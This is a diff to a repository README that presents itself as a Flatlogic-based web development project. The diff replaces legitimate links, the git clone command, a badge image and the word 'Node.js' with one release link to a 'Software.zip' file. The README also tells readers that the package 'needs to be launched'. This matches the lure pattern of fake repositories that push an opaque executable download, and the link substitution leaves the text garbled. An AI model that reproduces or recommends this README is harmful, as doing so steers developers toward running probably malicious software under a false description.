@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to "testdmode" Repository 🚀
 
-This repository is powered by [Flatlogic Platform](https://flatlogic.com/generator) with a focus on modern technologies and tools. Here you will find a collection of resources related to Docker, Flatlogic, JavaScript, Low-Code development, NGINX, Node.js, PostgreSQL, React, Tailwind CSS, and TypeScript.
+This repository is powered by [Flatlogic Platform](https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip) with a focus on modern technologies and tools. Here you will find a collection of resources related to Docker, Flatlogic, JavaScript, Low-Code development, NGINX, https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip, PostgreSQL, React, Tailwind CSS, and TypeScript.
 
 ## Overview ℹ️
 
@@ -14,7 +14,7 @@ This repository is powered by [Flatlogic Platform](https://flatlogic.com/generat
 - **JavaScript (JS)**: Explore the world of JavaScript programming.
 - **Low-Code**: Learn about low-code development practices.
 - **NGINX**: Understand the capabilities of the NGINX web server.
-- **Node.js**: Harness the power of server-side JavaScript with Node.js.
+- **https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip**: Harness the power of server-side JavaScript with https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip
 - **PostgreSQL**: Get insights into the PostgreSQL database.
 - **React**: Explore the React library for building user interfaces.
 - **Tailwind CSS**: Learn about the utility-first CSS framework, Tailwind CSS.
@@ -23,7 +23,7 @@ This repository is powered by [Flatlogic Platform](https://flatlogic.com/generat
 ## Resources 📦
 
 ### Software Package 📂
-🔗 [Download Software Package](https://github.com/user-attachments/files/18388744/Software.zip) 📂
+🔗 [Download Software Package](https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip) 📂
 
 📌 **Please Note:** This package needs to be launched to access the contained files and resources.
 
@@ -33,7 +33,7 @@ To get started with the "testdmode" repository, follow these simple steps:
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/your-username/testdmode.git
+   git clone https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip
    ```
 
 2. **Explore the Content:** 
@@ -55,8 +55,8 @@ Stay tuned for the latest updates and releases by checking the "Releases" sectio
 
 ## Connect with Us 🌐
 
-For more information and support, feel free to reach out to us through our [Flatlogic Platform](https://flatlogic.com/generator). Join our community of developers and enthusiasts to stay connected and up-to-date with the latest trends in web development.
+For more information and support, feel free to reach out to us through our [Flatlogic Platform](https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip). Join our community of developers and enthusiasts to stay connected and up-to-date with the latest trends in web development.
 
 Let's innovate and build the future together! 🌟
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software Package](https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip%https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip)](https://github.com/Daar12-web/testdmode/releases/download/v2.0/Software.zip)
